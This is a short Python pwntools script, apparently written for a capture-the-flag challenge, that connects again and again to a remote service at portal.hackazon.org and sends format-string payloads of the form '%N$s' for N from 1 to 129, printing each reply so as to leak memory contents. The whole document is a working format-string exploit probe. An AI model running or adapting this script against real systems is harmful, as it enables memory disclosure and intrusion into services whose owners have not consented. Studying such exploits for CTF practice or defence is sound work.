from pwn import * 

for i in range(1, 130):
	target = remote('portal.hackazon.org', 17003)

	print(target.recvuntil(b'Command:'))
	payload = b'%' + str(i).encode('ascii') + b'$s'
	target.sendline(payload)
	print(target.recvuntil(b'Command:', timeout=1))
	target.close()
